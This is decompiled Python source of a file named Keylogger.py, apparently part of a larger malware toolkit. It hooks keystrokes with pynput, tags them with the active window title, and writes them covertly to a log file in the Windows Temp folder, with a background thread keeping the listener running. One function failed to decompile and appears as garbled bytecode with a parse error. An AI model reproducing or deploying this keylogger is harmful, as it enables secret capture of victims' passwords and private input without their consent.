# decompyle3 version 3.7.5
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Aug 17 2021, 15:56:41) 
# [GCC 10.2.1 20210110]
# Embedded file name: Core\Other\Keylogger.py
import os, win32gui
try:
    from threading import Thread
    from pynput.keyboard import Key, Listener
except ImportError:
    raise SystemExit('Please run › pip install pynput')
else:
    Count = 0
    Keys = []
    WindowsTitle = ''

    def Keyboard(Key):
        global Count
        global Keys
        Keys.append(Key)
        Count += 1
        if Count >= 1:
            WriteFile(Keys)
            Keys = []
            Count = 0


    def WriteFile(Key):
        global WindowsTitle
        with open((os.getenv('Temp') + '\\Keylogs.txt'), 'a', encoding='utf-8') as f:
            if WindowsTitle != win32gui.GetWindowText(win32gui.GetForegroundWindow()):
                f.write('\n\n' + win32gui.GetWindowText(win32gui.GetForegroundWindow()) + '\n')
            if str(Key).find('space') >= 0:
                f.write(' ')
            elif str(Key).find('Key') == -1:
                Key = str(Key[0]).replace("'", '')
            try:
                f.write(Key)
            except:
                pass
            else:
                WindowsTitle = win32gui.GetWindowText(win32gui.GetForegroundWindow())


    def Threader--- This code section failed: ---
              0_0  COME_FROM            48  '48'
              0_1  COME_FROM            44  '44'
              0_2  COME_FROM            34  '34'

 L.  57         0  SETUP_FINALLY        36  'to 36'

 L.  58         2  LOAD_GLOBAL              Listener
                4  LOAD_GLOBAL              Keyboard
                6  LOAD_CONST               ('on_press',)
                8  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               10  SETUP_WITH           26  'to 26'
               12  STORE_FAST               'listener'

 L.  59        14  LOAD_FAST                'listener'
               16  LOAD_METHOD              join
               18  CALL_METHOD_0         0  ''
               20  POP_TOP          
               22  POP_BLOCK        
               24  BEGIN_FINALLY    
             26_0  COME_FROM_WITH       10  '10'
               26  WITH_CLEANUP_START
               28  WITH_CLEANUP_FINISH
               30  END_FINALLY      
               32  POP_BLOCK        
               34  JUMP_BACK             0  'to 0'
             36_0  COME_FROM_FINALLY     0  '0'

 L.  60        36  POP_TOP          
               38  POP_TOP          
               40  POP_TOP          

 L.  61        42  POP_EXCEPT       
               44  JUMP_BACK             0  'to 0'
               46  END_FINALLY      
               48  JUMP_BACK             0  'to 0'

Parse error at or near `JUMP_BACK' instruction at offset 44


    Thread(target=Threader).start()